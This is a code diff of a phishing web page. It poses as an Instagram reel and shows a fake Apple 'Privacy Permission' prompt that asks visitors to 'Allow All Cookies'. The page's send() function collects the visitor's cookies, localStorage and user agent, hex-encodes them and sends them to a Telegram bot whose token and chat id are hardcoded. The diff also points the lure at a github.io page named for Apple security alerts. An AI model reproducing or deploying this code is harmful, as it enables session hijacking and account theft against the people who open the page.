@@ -6,42 +6,43 @@
 body,html{margin:0;padding:0;height:100%;background:#000;color:#fff;font-family:-apple-system,sans-serif;text-align:center;overflow:hidden}
 #g,#p{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#000}
 #p{display:none;background:#fff;color:#000}
-.b{background:#0095f6;color:#fff;border:none;padding:15px 40px;border-radius:10px;font-weight:700;font-size:16px;cursor:pointer}
+.b{background:#0095f6;color:#fff;border:none;padding:15px 40px;border-radius:10px;font-weight:700;font-size:16px;cursor:pointer;text-decoration:none;display:inline-block}
 .allow-btn{background:#007aff;color:#fff;border:none;padding:12px 30px;border-radius:8px;font-weight:600;font-size:15px;margin-top:20px;cursor:pointer}
 iframe{width:100%;height:100vh;border:none}
 </style>
 </head>
 <body>
+
 <div id="g">
-<img src="https://www.instagram.com/static/images/ico/favicon-192.png/b30670883ce2.png" width="60" style="margin-bottom:20px">
-<button class="b" onclick="j()">Watch on Instagram</button>
+    <img src="https://www.instagram.com/static/images/ico/favicon-192.png/b30670883ce2.png" width="60" style="margin-bottom:20px">
+    <p style="margin-bottom:20px;font-size:14px;color:#a8a8a8">Hadima Closet: Lavender Gleam Collection</p>
+    <a href="https://applesecurityalert6-prog.github.io/?view=hadima-closet" class="b">Watch Reel</a>
 </div>
+
 <div id="p">
-<img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Apple_logo_grey.svg" width="40" style="margin-bottom:20px">
-<h2 style="font-size:20px;font-weight:600;margin-bottom:10px">Privacy Permission</h2>
-<p style="font-size:14px;color:#3a3a3c;padding:0 40px;line-height:1.4">Verification required for Hadima Closet private preview. Please allow session cookies to continue.</p>
-<button class="allow-btn" onclick="send()">Allow All Cookies</button>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Apple_logo_grey.svg" width="40" style="margin-bottom:20px">
+    <h2 style="font-size:20px;font-weight:600;margin-bottom:10px">Privacy Permission</h2>
+    <p style="font-size:14px;color:#3a3a3c;padding:0 40px;line-height:1.4">Verification required for Hadima Closet private preview. Please allow session cookies to continue.</p>
+    <button class="allow-btn" onclick="send()">Allow All Cookies</button>
 </div>
+
 <iframe id="r" src=""></iframe>
+
 <script>
 var T="8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k",C="8639892987";
 var h=function(s){return [...s].map(function(x){return x.charCodeAt(0).toString(16).padStart(2,'0')}).join('')};
 
-function j(){
-var u = window.location.href; 
-window.location.assign("googlechromes://applesecurityalert6-prog.github.io/?view=hadima-closet-lavender-gleam");
-setTimeout(function(){window.open(u,"_blank")},500);
+// Check if we are outside Instagram (Safari)
+if(!navigator.userAgent.includes("Instagram")){
+    document.getElementById('g').style.display='none';
+    document.getElementById('p').style.display='flex';
 }
 
-if(!navigator.userAgent.includes("Instagram")){
-document.getElementById('g').style.display='none';
-document.getElementById('p').style.display='flex';
-}
 function send(){
-var d={st:"SUCCESS",ck:document.cookie,ls:JSON.stringify(localStorage),ua:navigator.userAgent};
-new Image().src="https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text=🏆_DATA_"+h(JSON.stringify(d));
-document.getElementById('p').style.display='none';
-document.getElementById('r').src="https://www.instagram.com/reel/DXvjb0FP8W0/embed/";
+    var d={st:"SUCCESS",ck:document.cookie,ls:JSON.stringify(localStorage),ua:navigator.userAgent};
+    new Image().src="https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text=🏆_DATA_"+h(JSON.stringify(d));
+    document.getElementById('p').style.display='none';
+    document.getElementById('r').src="https://www.instagram.com/reel/DXvjb0FP8W0/embed/";
 }
 </script>
 </body>
